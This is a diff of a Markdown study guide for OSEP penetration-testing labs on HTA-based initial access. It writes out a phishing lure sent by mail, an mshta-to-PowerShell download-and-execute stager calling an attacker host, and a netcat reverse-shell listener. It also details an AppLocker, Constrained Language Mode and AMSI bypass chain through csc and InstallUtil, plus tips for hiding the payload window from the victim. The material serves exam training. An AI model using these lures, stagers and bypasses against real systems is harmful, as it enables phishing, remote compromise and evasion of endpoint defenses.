@@ -2,66 +2,64 @@
 For the official OSEP labs/exam, or systems you are written-authorized to test. Do not use against unauthorized systems.
 :::
 
-# 02 · HTA entry (first stage when mail has no Office macros)
+# HTA entry
 
-> **Covers scenarios:** 6, 7, 8
->
-> **Course mapping:** Chapter 13 (§13.3.1–13.3.3 PowerShell CLM, custom runspaces and InstallUtil, §13.4 Bypassing AppLocker with C#, §13.5 JScript & MSHTA), Chapter 12 (§12.2–12.4 AMSI)
->
-> **Prerequisites:** HTTP service on the attacker reachable from the target (Kali `python3 -m http.server` is enough); a Windows environment that can compile .NET Framework (any Win10 on the lab net or your own Windows VM, to produce `m02-clm-bypass-runspace.exe`); mail delivery path (swaks/sendEmail; see scenario 6).
+If mail will open a link or `.hta` but Office macros are unavailable, this is usually the next-fastest initial-access path. Keep stage one short — trigger, fetch, hand off. Name the failure before you rewrite the payload: HTA never ran vs HTA ran but the next stage was blocked.
 
-**How the three scenarios relate**: Scenario 6 is “HTA as first stage; target has AppLocker, no Office.” Scenario 7 is “AppLocker + CLM + AMSI all on,” so you must **combine** HTA, an InstallUtil-compatible assembly, a custom Runspace, AMSI handling, and a stage-2 Runner and verify the full chain. Scenario 8 is **timing/lifecycle triage** when “download+execute in one command fails, but split works” — do not blame AV first. All three share the same files; differences are combination and triage order.
+## Mail entry, no Office macros
 
----
+If the target will open an HTA and AppLocker blocks a standalone EXE, use `mshta` as the host — don't land and launch an uploaded EXE.
 
-## Scenario 6: Mail entry exists, but no usable Office macro entry
+- [ ] Start the static server and listener
+- [ ] Prove HTA fires with the callback (`m02-hta-callback.hta`)
+- [ ] If there is no CLM, deliver the PowerShell stager (`m02-hta-powershell-stager.hta` → `shell.ps1`)
+- [ ] If CLM is on or `powershell.exe` is denied, switch to the combined chain below — don't keep trying IEX variants here
 
-**Situation**: Target has no Office (macro entry unavailable) but will open a link or `.hta` from mail; AppLocker is on, so directly launching an uploaded EXE is denied. You need an execution chain that does **not** start a standalone EXE.
+Start the server and listener:
 
-**Assumptions**: Target can receive mail and click links; user will open HTA (browser opens a URL form, or double-clicks an attachment); AppLocker is in “default rules” shape (allows signed programs under `%SystemRoot%\*` such as `mshta.exe`, `powershell.exe`, `csc.exe`, `InstallUtil.exe`) but **does not allow arbitrary uploaded EXEs to start**. You have: `http://LHOST` reachable by the target (static file server), listen port `LPORT`.
+```bash
+mkdir -p ~/osep/payloads/web && cd ~/osep/payloads/web
+cp <this-project>/m02-hta-callback.hta ./ok.hta
+cp <this-project>/m02-hta-powershell-stager.hta ./stager.hta
+printf 'ok' > ok.txt          # for callback probe
+python3 -m http.server 80     # or 8080; put the full URL in the mail
+nc -lvnp LPORT                # stage-2 reverse listener
+```
 
-**Prepare (attacker side)**:
-1. Stand up static server and listener:
-   ```bash
-   mkdir -p ~/osep/payloads/web && cd ~/osep/payloads/web
-   cp <this-project>/m02-hta-callback.hta ./ok.hta
-   cp <this-project>/m02-hta-powershell-stager.hta ./stager.hta
-   printf 'ok' > ok.txt          # for callback probe
-   python3 -m http.server 80     # or 8080; put the full URL in the mail
-   nc -lvnp LPORT                # stage-2 reverse listener
-   ```
-2. Pre-prepare stage-2 script `shell.ps1` (stable TCP reverse; see quick-reference notes `C# for CLM Bypass with PS Script` shell.ps1 template; usable as-is when scenario 6 has no CLM). Replace `[ATTACKER_IP]`/`[PORT]` with `LHOST`/`LPORT` and place it at the web root.
-3. Pre-compile **both x86 and x64** InstallUtil-compatible runners (`m02-clm-bypass-runspace.cs`) using scenario 7’s method — this scenario’s fallback.
-4. Mail delivery (quick-reference notes `HTA` section; URL form beats attachments — attachments are often filtered):
-   ```bash
-   # Send a "link" lure (recommended): HTA at web root; body only gives http://LHOST/stager.hta
-   swaks --body 'Please click here http://LHOST/stager.hta' \
-     --add-header "MIME-Version: 1.0" --add-header "Content-Type: text/html" \
-     --header "Subject: Invoice issue" -t TARGET -f USER@LHOST_DOMAIN \
-     --server SMTP_SERVER
-   # Attachment form (may be filtered; backup only):
-   sendEmail -s SMTP_SERVER -t TARGET -f sender@example.com \
-     -u "Subject: issue" -m "see attached" -a ~/osep/payloads/web/stager.hta
-   ```
+Pre-prepare stage-2 `shell.ps1` (stable TCP reverse; usable as-is when there is no CLM). Replace `[ATTACKER_IP]`/`[PORT]` with `LHOST`/`LPORT` and place it at the web root. Pre-compile **both x86 and x64** InstallUtil-compatible runners (`m02-clm-bypass-runspace.cs`) as a fallback — see the combined-chain compile commands below.
 
-**Procedure**:
-1. First prove “HTA fires and JScript runs”: send `ok.hta` to the target (or open `http://LHOST/ok.hta` on a same-class controlled host). It only does one harmless HTTP callback (`/cb?u=<user>@<host>`) and drops no payload. **Seeing both `/ok.hta` and `/cb` in the server log proves mshta→JScript→ActiveX is fully open.**
-2. When there is no CLM (confirm with `powershell -ep bypass` as in step 3): use `stager.hta`. mshta runs its JScript; `WScript.Shell.Run` starts `powershell.exe -nop -w hidden -Command "IEX(DownloadString 'http://LHOST/shell.ps1')"`. Watch for:
-   - web log `GET /stager.hta`, `GET /shell.ps1`;
-   - `nc` listener gets a callback.
-3. Decide whether to enter scenario 7’s full chain: in-session run `m00-recon-defenses.ps1`; check `$ExecutionContext.SessionState.LanguageMode` (`ConstrainedLanguage` = CLM), effective AppLocker rules, and whether AMSI is active. **If either CLM or “powershell.exe denied by AppLocker” is true, switch immediately to scenario 7’s combined chain — do not keep trying IEX variants here.**
-4. If only “EXE blocked by AppLocker, PowerShell available” (no CLM): still use HTA + PowerShell to download to disk, then load via `InstallUtil.exe /U` (InstallUtil under `%SystemRoot%`, allowed by default rules). Runner: `m02-clm-bypass-runspace.cs`.
-5. Bitness table (HTA is hosted by mshta.exe, follows OS bitness): on x64, `C:\Windows\System32\mshta.exe` (64-bit) pulls 64-bit powershell; for an x86 payload use `C:\Windows\SysWOW64\mshta.exe`, or call `C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` explicitly in the script.
+Mail a link (prefer a URL over an attachment — attachments are often filtered):
 
-**Scripts used**:
-| Script | Purpose | Key parameters |
-|---|---|---|
-| `m02-hta-callback.hta` | Minimal HTA; confirm mshta/JScript/egress | replace `LHOST` |
-| `m02-hta-powershell-stager.hta` | HTA→PowerShell IEX pull `shell.ps1` | replace `LHOST` |
-| `m02-clm-bypass-runspace.cs` | InstallUtil-compatible runner (build x86 and x64) | replace `LHOST` then compile |
-| `m02-hta-embedded-clm-bypass.hta` | Single-file fallback: embedded C#, compile-and-run on target | replace `LHOST` |
+```bash
+# Send a "link" lure (recommended): HTA at web root; body only gives http://LHOST/stager.hta
+swaks --body 'Please click here http://LHOST/stager.hta' \
+  --add-header "MIME-Version: 1.0" --add-header "Content-Type: text/html" \
+  --header "Subject: Invoice issue" -t TARGET -f USER@LHOST_DOMAIN \
+  --server SMTP_SERVER
+# Attachment form (may be filtered; backup only):
+sendEmail -s SMTP_SERVER -t TARGET -f sender@example.com \
+  -u "Subject: issue" -m "see attached" -a ~/osep/payloads/web/stager.hta
+```
 
-#### `m02-hta-callback.hta`
+A `GET /ok.hta` and `GET /cb` in the server log means mshta → JScript → ActiveX is fully open. Then `stager.hta` has `WScript.Shell.Run` start `powershell.exe -nop -w hidden -Command "IEX(DownloadString 'http://LHOST/shell.ps1')"`. Watch for `GET /stager.hta`, `GET /shell.ps1`, and an `nc` callback.
+
+In-session, decide whether to leave this path:
+
+```powershell
+$ExecutionContext.SessionState.LanguageMode            # ConstrainedLanguage = CLM
+Get-AppLockerPolicy -Effective                          # effective rules
+Get-Process -Name powershell | % { $_.Modules | ? ModuleName -eq 'amsi.dll' }
+```
+
+If LanguageMode is `ConstrainedLanguage` or `powershell.exe` is denied by AppLocker, switch immediately to the combined chain — don't keep trying IEX variants here. If only EXEs are blocked and PowerShell is available, HTA can still drop a file and load it with `InstallUtil.exe /U` (InstallUtil under `%SystemRoot%`, allowed by default rules). Runner: `m02-clm-bypass-runspace.cs`.
+
+On x64, `C:\Windows\System32\mshta.exe` is 64-bit and pulls 64-bit PowerShell; for an x86 payload use `C:\Windows\SysWOW64\mshta.exe`, or call `C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` explicitly.
+
+If there is no `GET /xxx.hta`, delivery failed — the mail never opened, or the attachment was filtered; send only a link, or a shortcut that runs `C:\Windows\System32\mshta.exe http://LHOST/stager.hta`. If there is a GET for the HTA but no `/cb`, JScript inside mshta never ran. If `mshta.exe` itself is denied by AppLocker, switch to `cscript`/`wscript` JScript (module 03), or another signed host allowed by default. If `DownloadString` is blocked, handle AMSI first or jump straight to the combined chain. If egress is proxy-only, set `[System.Net.WebRequest]::DefaultWebProxy` inside `shell.ps1` (module 09).
+
+HTA flashes a desktop window — `<HTA:APPLICATION ... WINDOWSTATE="minimize">` and `window.close()` at the end keep it from sitting in front of the user. Run the harmless callback before any payload so you don't burn a whole mail round on a dead entry.
+
+::: details `m02-hta-callback.hta` · click to expand
 
 ````html
 <!--
@@ -112,7 +110,9 @@ Test status: Not Windows-lab tested (this host is macOS); JScript syntax hand-re
 </html>
 ````
 
-#### `m02-hta-powershell-stager.hta`
+:::
+
+::: details `m02-hta-powershell-stager.hta` · click to expand
 
 ````html
 <!--
@@ -176,7 +176,9 @@ Test status: Not Windows-lab tested (this host is macOS); quote-nesting rules in
 </html>
 ````
 
-#### `m02-clm-bypass-runspace.cs`
+:::
+
+::: details `m02-clm-bypass-runspace.cs` · click to expand
 
 ````csharp
 // Purpose: InstallUtil-compatible runner — InstallUtil.exe /U triggers Uninstall(),
@@ -260,7 +262,60 @@ namespace M02
 }
 ````
 
-#### `m02-hta-embedded-clm-bypass.hta`
+:::
+
+
+## AppLocker, CLM, and AMSI together
+
+If HTA runs but AppLocker, CLM, and AMSI are all on, a component working alone is not enough — walk the full chain end-to-end.
+
+- [ ] Recon that all three are present (`m00-recon-defenses.ps1`)
+- [ ] Confirm mshta itself is not blocked (`m02-hta-callback.hta` → `GET /cb`)
+- [ ] Host an improved `shell.ps1` with AMSI handling on the first line, then the reverse
+- [ ] Compile both x64 and x86 runners, or use the single-file embedded HTA (on-target `csc` + `InstallUtil /U`)
+- [ ] Watch the echo points and the `nc` callback
+
+Compile the runners on a Windows build host:
+
+```bat
+:: x64 (preferred on 64-bit targets)
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /nologo ^
+  /out:%USERPROFILE%\m02stage64.exe ^
+  /r:System.Management.Automation.dll /r:System.Configuration.Install.dll ^
+  m02-clm-bypass-runspace.cs
+:: x86 (backup)
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /nologo ^
+  /out:%USERPROFILE%\m02stage32.exe ^
+  /r:System.Management.Automation.dll /r:System.Configuration.Install.dll ^
+  m02-clm-bypass-runspace.cs
+```
+
+If `/r:System.Management.Automation.dll` fails to resolve, reference the full GAC path: `C:\Windows\assembly\GAC_MSIL\System.Management.Automation\<ver>__31bf3856ad364e35\System.Management.Automation.dll`. Also add a `System.Configuration.Install` reference. Optional: `certutil -encode m02stage64.exe enc.txt` so the runner can travel as text (decode on target with `certutil -decode`). Place exe/enc.txt and `shell.ps1` at the web root; start `python3 -m http.server` and `nc -lvnp LPORT`.
+
+Trigger the single-file chain (embedded C# + on-target csc + InstallUtil /U), or run the equivalent download → decode → InstallUtil steps by hand:
+
+```
+mshta.exe http://LHOST/m02-hta-embedded-clm-bypass.hta
+```
+
+In-chain: write `m02stage.cs` to `C:\Windows\Tasks\` (or `%TEMP%`) → `csc.exe` builds `m02stage.exe` (Framework64/Framework by process bitness) → `InstallUtil.exe /logfile= /LogToConsole=false /U <exe>` triggers `Installer.Uninstall()` → a custom Runspace does AMSI handling, then `IEX(DownloadString 'http://LHOST/shell.ps1')` → `shell.ps1` reverses to `LHOST:LPORT`. Echo points: `hta-start` / `cs-written` / `compile-ok` / `installutil-done` / final `nc` callback.
+
+Why this clears all three gates: mshta/csc/InstallUtil are signed System32 programs, so direct launch is allowed, and the runner is an assembly loaded by InstallUtil — EXE rules do not apply. CLM only applies to the engine inside `powershell.exe`; a self-built Runspace inside InstallUtil is FullLanguage. AMSI still attaches to that engine, so run `amsiInitFailed` reflection in the **same** Runspace before IEX.
+
+The same runner can also be triggered without mshta:
+
+```
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe \
+  /logfile= /LogToConsole=false /U C:\Windows\Tasks\m02stage64.exe
+```
+
+If InstallUtil itself is denied, use the DotNetToJScript variant: compile `m02-clm-bypass-dotnettojscript.cs` as a library, serialize to `.js` with DotNetToJScript, and embed in the HTA (module 03) — no EXE and no InstallUtil.
+
+If the chain stops before compile, write or `csc` is blocked. If it stops after InstallUtil with no callback, runner bitness is wrong or `shell.ps1` is blocked by AMSI/AV — swap the other build, and confirm actual mshta/InstallUtil bitness (Framework64 is 64-bit). If the AMSI-handling line itself is blocked (`AmsiUtils` is a signature), switch reflection styles or string-split concatenation (`m05-amsi-bypass-variants.ps1`). If each link works alone but the chain does nothing, triage timing in the next section — don't assume AV.
+
+Walk this chain end-to-end on the lab net before the exam. Keep x64/x86 copies of the runner and `shell.ps1` and pick by the measured target. Prefer a simple TCP reverse + AMSI handling over a large Meterpreter payload. Minimize the HTA window and close it immediately.
+
+::: details `m02-hta-embedded-clm-bypass.hta` · click to expand
 
 ````html
 <!--
@@ -403,71 +458,9 @@ Note: embedded C# matches m02-clm-bypass-runspace.cs logic; keep both in sync wh
 </html>
 ````
 
-**Validation**: web log shows `GET /xxx.hta` → `GET /shell.ps1` (or `/cb`) in order, then `nc -lvnp LPORT` gets a callback; `whoami` is the target user. If any link is missing, locate it with scenario 8’s “echo each stage” approach.
+:::
 
-**Failure branches and alternatives**:
-- If `mshta.exe` is denied by AppLocker (policy tightened even for System32) → switch to `cscript/wscript` JScript (see M03 scenarios 9–10), or another signed host allowed by default.
-- If `.hta` attachments are filtered by the mail gateway → send only a link with HTA at the web root; or lure with a shortcut that runs `C:\Windows\System32\mshta.exe http://LHOST/stager.hta`.
-- If `DownloadString` is blocked (AMSI/Defender scanning IEX content) → run `Disable AMSI` first (same quick-reference notes section) then IEX, or jump straight to scenario 7’s combined chain.
-- If egress is proxy-only → in shell.ps1 set `[System.Net.WebRequest]::DefaultWebProxy` explicitly (see M09 scenario 28).
-
-**Exam / OPSEC notes**: HTA flashes a desktop window — use `<HTA:APPLICATION ... WINDOWSTATE="minimize">` and `self.close()` at the end so it does not sit in front of the user; keep real attacker domains out of the mail body and use business-looking lures; run the harmless callback before any payload so you do not burn a whole mail round on a dead entry.
-
----
-
-## Scenario 7: HTA can fire, but the target has AppLocker, CLM, and AMSI together
-
-**Situation**: HTA runs, but ordinary EXEs are limited by application control; PowerShell is in Constrained Language Mode (CLM: `Add-Type`, reflection, dynamic compile unavailable); script content is also AMSI-scanned. **Passing each component alone ≠ the chain works** — you must validate the full combination.
-
-**Assumptions**: AppLocker default rules allow signed System32 programs: `mshta.exe`, `powershell.exe` (but enters CLM), `csc.exe`, `InstallUtil.exe`; script files (`.ps1`) are limited by script rules/language mode so you cannot just `powershell -File`. Custom Runspace is the key: a non-powershell.exe process (the .NET program hosted by InstallUtil) creates `System.Management.Automation.Runspaces`; that engine runs in FullLanguage and is not bound by AppLocker script rules.
-
-**Prepare (attacker side)**:
-1. Improved `shell.ps1`: in the quick-reference notes reverse template (`C# for CLM Bypass with PS Script` section) **insert AMSI handling on the first line** (`amsiInitFailed` reflection works under FullLanguage), then the reverse code; replace `LHOST/LPORT`. Host at the web root.
-2. On a Windows build host produce runners (x64 and x86 each):
-   ```bat
-   :: x64 (preferred on 64-bit targets)
-   C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /nologo ^
-     /out:%USERPROFILE%\m02stage64.exe ^
-     /r:System.Management.Automation.dll /r:System.Configuration.Install.dll ^
-     m02-clm-bypass-runspace.cs
-   :: x86 (backup)
-   C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /nologo ^
-     /out:%USERPROFILE%\m02stage32.exe ^
-     /r:System.Management.Automation.dll /r:System.Configuration.Install.dll ^
-     m02-clm-bypass-runspace.cs
-   ```
-   If `/r:System.Management.Automation.dll` fails to resolve, reference the full GAC path: `C:\Windows\assembly\GAC_MSIL\System.Management.Automation\<ver>__31bf3856ad364e35\System.Management.Automation.dll`. Also add a `System.Configuration.Install` reference (quick-reference notes notes VS often misses it).
-3. Optional: `certutil -encode m02stage64.exe enc.txt` so the runner can travel as text through mail/download (decode on target with `certutil -decode`; see quick-reference notes steps).
-4. Place exe/enc.txt and shell.ps1 at the Kali web root; start `python3 -m http.server` and `nc -lvnp LPORT`.
-
-**Procedure**:
-1. Recon that all three are present (`m00-recon-defenses.ps1`): effective AppLocker rules, language mode `ConstrainedLanguage`, whether `amsi.dll` is in the process (quick-reference notes `Enumerate Defenses` / `Disable AMSI`). Only then is this chain worth running.
-2. First run `m02-hta-callback.hta` to confirm the mshta host itself is not blocked by policy/AV by process name (callback `GET /cb` is enough).
-3. Use `m02-hta-embedded-clm-bypass.hta` (single file: embedded C# + on-target csc + InstallUtil /U) or manually run the equivalent “download→decode→InstallUtil” chain:
-   ```
-   mshta.exe http://LHOST/m02-hta-embedded-clm-bypass.hta
-   ```
-   In-chain logic (each step has an HTTP echo for locating breaks):
-   1. Write `m02stage.cs` to `C:\Windows\Tasks\` (user-writable; or `%TEMP%`);
-   2. Call `csc.exe` to build `m02stage.exe` (Framework64/Framework by process bitness);
-   3. `InstallUtil.exe /logfile= /LogToConsole=false /U <exe>` → triggers `Installer.Uninstall()`;
-   4. Inside Uninstall: new custom Runspace → AMSI handling in that engine → `IEX(DownloadString 'http://LHOST/shell.ps1')`;
-   5. shell.ps1 reverses to `LHOST:LPORT`.
-4. **Why this clears all three gates** (memorize; exam may ask you to explain):
-   - AppLocker: mshta/csc/InstallUtil are signed System32 programs → direct launch allowed; the runner exe is “an assembly loaded by InstallUtil,” not a process AppLocker launches → EXE rules do not apply;
-   - CLM: Constrained Language Mode only applies to the engine inside powershell.exe; a self-built Runspace inside InstallUtil is FullLanguage — `Add-Type`/reflection/`IEX` all work;
-   - AMSI: AMSI attaches to the System.Management.Automation engine (whoever created it), so in the **same custom Runspace run `amsiInitFailed` reflection first**, then IEX the download.
-5. Alternate trigger for the same runner: `InstallUtil.exe /logfile= /LogToConsole=false /U` can also be called from PowerShell (even under CLM if allowed commands remain) or an existing session — the runner need not go through mshta. If InstallUtil itself is denied by policy → DotNetToJScript variant: compile `m02-clm-bypass-dotnettojscript.cs` as a library, serialize to `.js` with DotNetToJScript, embed in HTA (JScript load in M03) — no EXE and no InstallUtil.
-
-**Scripts used**:
-| Script | Purpose | Key parameters |
-|---|---|---|
-| `m02-hta-embedded-clm-bypass.hta` | Single-file full chain: mshta→csc→InstallUtil→Runspace→IEX | replace `LHOST` |
-| `m02-clm-bypass-runspace.cs` | InstallUtil-compatible runner (custom Runspace + AMSI handling) | replace `LHOST`, compile x86/x64 |
-| `m02-clm-bypass-dotnettojscript.cs` | No-EXE alternate: DotNetToJScript payload class | compile as library; serialize with M03 tools |
-| `m02-hta-download-exec-split.hta` | When the chain fails, switch to “split two stages” triage | replace `LHOST` |
-
-#### `m02-clm-bypass-dotnettojscript.cs`
+::: details `m02-clm-bypass-dotnettojscript.cs` · click to expand
 
 ````csharp
 // Purpose: C# payload skeleton for the DotNetToJScript path (CLM-bypass edition) —
@@ -526,7 +519,36 @@ namespace Payload
 }
 ````
 
-#### `m02-hta-download-exec-split.hta`
+:::
+
+
+## Download and execute together fail
+
+If the HTA opened and the download URL was hit, but there is no callback, treat it as timing or lifecycle — don't assume AV first.
+
+- [ ] Start the server, listener, and a `tail -f` on the web access log — every conclusion here comes from log order
+- [ ] Answer the four log questions below
+- [ ] Run the split HTA (`m02-hta-download-exec-split.hta`)
+- [ ] Map the log to a cause, then fix that cause
+
+Four questions, line by line in the web log:
+
+1. Is there `GET /xxx.hta`? No → delivery/trigger problem, not the exec chain.
+2. Is there the first-line echo (`/cb?stage=hta-start`)? No → JScript inside mshta never ran.
+3. Is there `GET /shell.ps1`? No → the stage-1 command never reached download.
+4. Is there a callback? No, but 1–3 all yes → the break is between download and execute.
+
+The split HTA does `WScript.Shell.Run(downloadCmd, 0, true)` (`true` = wait for that process to exit), checks the file exists, echoes `download-done`, then `Run(execCmd, 0, true)` and echoes `exec-done`. A 2–5 second `WScript.Sleep` between stages gives realtime scanners a release window.
+
+<!-- VERIFY: m02-hta-download-exec-split.hta calls WScript.Sleep inside mshta. WScript is a WSH global and is often undefined in HTA; if the sleep throws, replace it with a setTimeout/busy-wait or run the same split logic under cscript. -->
+
+If stage 1 fails, the download command quotes or proxy are wrong — try `certutil.exe -urlcache -split -f URL OUT` or `bitsadmin.exe /transfer`, or set an explicit PowerShell proxy. If stage 1 is OK and stage 2 fails, the exec path is limited (CLM/AppLocker/AV) — switch exec to InstallUtil /U or a custom Runspace IEX, and keep download split. If both stages succeed alone but one combined command fails, stop trying one-liners: stay two-stage, or put two `Run`s in one `.hta` with `start /wait` semantics each, and Base64 the PowerShell with `-enc` so the command has one quote layer.
+
+Only when the logs show every stage succeeded, the split succeeds, and only the merge fails should AV/AMSI become a candidate — then retry with the combined-chain AMSI handling and shorter commands.
+
+If you suspect a scan race, use a fixed `WScript.Sleep(2000~5000)` or poll until the file is readable, then exec. If `window.close()` / `self.close()` takes children with it, launch exec via `schtasks` or `wmic process call create` so it leaves the host process tree (check AppLocker allowlists). Prefer writing under `C:\Windows\Tasks` or `%TEMP%`.
+
+::: details `m02-hta-download-exec-split.hta` · click to expand
 
 ````html
 <!--
@@ -621,104 +643,16 @@ Test status: Not Windows-lab tested (this host is macOS); JScript syntax hand-re
 </html>
 ````
 
-**Validation**: the chain has 4–5 HTTP echo points (`hta-start` / `cs-written` / `compile-ok` / `installutil-called` / final nc callback). On the exam, locate by which echo stops: stop before compile = write/csc blocked; stop after InstallUtil with no callback = runner bitness wrong or shell.ps1 blocked by AMSI/AV. Finish with `whoami` + `ipconfig /all` for identity and segment.
+:::
 
-**Failure branches and alternatives**:
-- If x64 runner has no callback but x86 does (or vice versa) → bitness mismatch; swap the other build; confirm actual mshta/InstallUtil bitness (Framework64 is 64-bit).
-- If InstallUtil itself is removed by AppLocker/policy → DotNetToJScript variant (no InstallUtil, no EXE).
-- If the AMSI-handling line itself is blocked (`AmsiUtils` string is a signature) → switch to other reflection styles from the `Disable AMSI` section or string-split concatenation; keep host-process bitness matched.
-- If on the real target “each link works alone, chained together does nothing” → triage timing per scenario 8; do not assume AV.
 
-**Exam / OPSEC notes**: the three-piece combined chain **must be walked end-to-end on the lab net** before the exam — order, bitness, missing references, InstallUtil paths that were never verified are time sinks; keep x64/x86 copies of runner and shell.ps1 and pick by measured target; avoid large Meterpreter payloads — simple TCP reverse + AMSI handling is most stable (quick-reference notes notes some samples fail with AMSI on); HTA still flashes briefly — minimize + immediate `self.close()`.
+## Cheat sheet
 
----
-
-## Scenario 8: HTA download and execute together fail; split works
-
-**Situation**: Target did open the HTA and did hit the download URL, but there is no final execution result — “split works, together does nothing.” Treat as a **timing and lifecycle** scenario; do not assume AV caused the failure.
-
-**Assumptions**: HTA can fire (scenario 6/7 callback already proven); download URL was hit (web log has GET); the “single combined command” contains both download and execute. Likely cause classes: A) quotes/escapes in one command line eaten at the cmd layer (most common: outer `Run("...")` doubles + inner PowerShell quotes + `&` `|` `;` parsed as entities inside HTML attributes); B) first process has not finished writing the file when the second starts reading; C) mshta main window `self.close()` exits early and host job/window-station lifecycle takes long children with it; D) the long combined text triggers AMSI/AV static scan while short splits do not; E) newly written file is under realtime scan and the follow-on process cannot open it (race).
-
-**Prepare (attacker side)**: put 3 files on the static server: `m02-hta-download-exec-split.hta`, the download source (`shell.ps1` or `stage2.ps1`), and `ok.txt` probe. Listen with `nc -lvnp LPORT`. **Also keep a terminal on `tail -f` of the web access log** — every conclusion in this scenario comes from log order, not guessing.
-
-**Procedure**:
-1. Gather evidence; answer four questions (check the web log line by line):
-   1. Is there `GET /xxx.hta`? No → delivery/trigger problem, not the exec chain;
-   2. Is there the HTA first-line echo (`/cb?stage=hta-start`)? No → JScript inside mshta never ran;
-   3. Is there `GET /shell.ps1` (download action)? No → stage-1 command never reached download;
-   4. Is there a callback? No, but 1–3 all yes → problem is “between download and execute,” i.e. A/B/C/E timing or lifecycle.
-2. Run “split two stages” with `m02-hta-download-exec-split.hta`:
-   - Stage 1: `WScript.Shell.Run(downloadCmd, 0, true)` — `true` means **wait for that process to exit**; after download, JScript checks file existence with `Scripting.FileSystemObject`, then echoes `GET /cb?stage=download-done`;
-   - Stage 2: only after the file exists, `Run(execCmd, 0, true)`, then echo `GET /cb?stage=exec-done`.
-   - Optionally insert 2–5 seconds of `WScript.Sleep` between them for realtime scanners/AV release windows (counter to B/E).
-3. Map the log to a cause class, then fix:
-   - Stage 1 echo fails → download command quotes/proxy (back to scenario 6 alts: `certutil`/`bitsadmin`, or explicit PowerShell proxy);
-   - Stage 1 OK, stage 2 fails → exec path limited (CLM/AppLocker/AV exec path) — switch exec to scenario 7’s runner trigger (InstallUtil /U or custom Runspace IEX);
-   - Both stages succeed alone, but one combined command fails → class A escape/parse or class C lifecycle: **stop trying one-liners**; stay two-stage; if a single file is required, put two `Run`s with `&&`/`;` in **one cmd string** with `start /wait` semantics each, and avoid nested quotes (Base64 the PowerShell with `-enc` so the command has one quote layer).
-4. “Single-file version with completion checks” (prepare if the question requires it): in one `.hta`, two sequential `Run(..., 0, true)` — do not rely on children surviving after `self.close()`; echo progress points before key actions. Verify echo order in the web log matches code order.
-5. Only when “logs show every stage succeeded, split succeeds, only merge fails” should AV/AMSI become a candidate — then retry with scenario 7 AMSI handling and shorter commands.
-
-**Scripts used**:
-| Script | Purpose | Key parameters |
-|---|---|---|
-| `m02-hta-download-exec-split.hta` | Download/exec split + file-existence check + progress echoes | replace `LHOST`, `OUT` |
-| `m02-hta-callback.hta` | Confirm HTA trigger and egress (first triage step) | replace `LHOST` |
-| `m02-hta-powershell-stager.hta` | Control: one-step IEX (“merged” shape) | replace `LHOST` |
-
-**Validation**: web log shows ordered echoes `hta-start → download-done → exec-done`; `nc` gets a callback. Side-by-side logs of “failed shape” vs “split shape” point at the broken stage; stable split success = problem located.
-
-**Failure branches and alternatives**:
-- If PowerShell download is blocked but browser/mshta egress is fine → switch downloader to `certutil -urlcache -split -f URL OUT` or `bitsadmin /transfer` (M10 download matrix applies).
-- If exec fails because CLM makes `-File shell.ps1` useless → switch exec to InstallUtil/custom Runspace (scenario 7 chain); keep download split.
-- If you suspect scan races → fixed `WScript.Sleep(2000~5000)` between stages, or poll until the file is readable then exec.
-- If mshta `self.close()` takes children with it → launch exec via `schtasks` or `wmic process call create` to leave the host process tree (lifecycle fix; check AppLocker allowlists).
-
-**Exam / OPSEC notes**: biggest pitfall is “swap AV bypasses without reading logs” and burning time — **echo first, conclude second**; split-stage echo points are triage evidence you can show on the exam; if a single-file merge must go to the user, keep the window minimized and close immediately so “download finished but window still open” is not noticed; prefer writing under `C:\Windows\Tasks` or `%TEMP%` to avoid protected-directory write alerts.
-
----
-
-## Module quick reference
-
-```bash
-# ---- Attacker side ----
-cd ~/osep/payloads/web && python3 -m http.server 80
-nc -lvnp LPORT
-# Mail lure (prefer link form):
-swaks --body 'Please click here http://LHOST/stager.hta' \
-  --add-header "MIME-Version: 1.0" --add-header "Content-Type: text/html" \
-  --header "Subject: issue" -t TARGET -f USER@example.com --server SMTP_SERVER
-
-# ---- Compile runner (Windows build host; x64 and x86 each) ----
-C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /nologo \
-  /out:m02stage64.exe /r:System.Management.Automation.dll \
-  /r:System.Configuration.Install.dll m02-clm-bypass-runspace.cs
-C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /nologo \
-  /out:m02stage32.exe /r:System.Management.Automation.dll \
-  /r:System.Configuration.Install.dll m02-clm-bypass-runspace.cs
-# Optional: encode exe to text for download chains:
-certutil -encode m02stage64.exe enc.txt
-
-# ---- Target-side triggers ----
-mshta.exe http://LHOST/m02-hta-callback.hta            # 1) confirm trigger
-mshta.exe http://LHOST/m02-hta-powershell-stager.hta   # 2) no CLM → direct IEX
-mshta.exe http://LHOST/m02-hta-embedded-clm-bypass.hta # 3) AppLocker+CLM+AMSI all on
-mshta.exe http://LHOST/m02-hta-download-exec-split.hta # 4) timing triage
-
-# ---- Decide whether to switch to the combined chain (in-session) ----
-$ExecutionContext.SessionState.LanguageMode            # ConstrainedLanguage = CLM
-Get-AppLockerPolicy -Effective                          # effective rules
-Get-Process -Name powershell | % { $_.Modules | ? ModuleName -eq 'amsi.dll' }
-
-# ---- Alternate trigger (no mshta) ----
-C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe \
-  /logfile= /LogToConsole=false /U C:\Windows\Tasks\m02stage64.exe
-```
-
-## Related script list
-
-- `m02-hta-callback.hta` — minimal HTA callback (shared first step for scenarios 6/7/8)
-- `m02-hta-powershell-stager.hta` — HTA→PowerShell IEX pull stage 2 (scenario 6; scenario 8 “merged” control)
-- `m02-hta-download-exec-split.hta` — download/exec split + file check + progress echoes (scenario 8)
-- `m02-hta-embedded-clm-bypass.hta` — embedded C# compile-now + InstallUtil /U + custom Runspace (scenario 7, single file)
-- `m02-clm-bypass-runspace.cs` — InstallUtil-compatible runner: custom Runspace + AMSI handling + IEX (scenarios 6/7)
-- `m02-clm-bypass-dotnettojscript.cs` — DotNetToJScript payload class; no EXE / no InstallUtil alternate (scenario 7)
+| You want to… | Use |
+|---|---|
+| Prove mshta / JScript / egress | `m02-hta-callback.hta` |
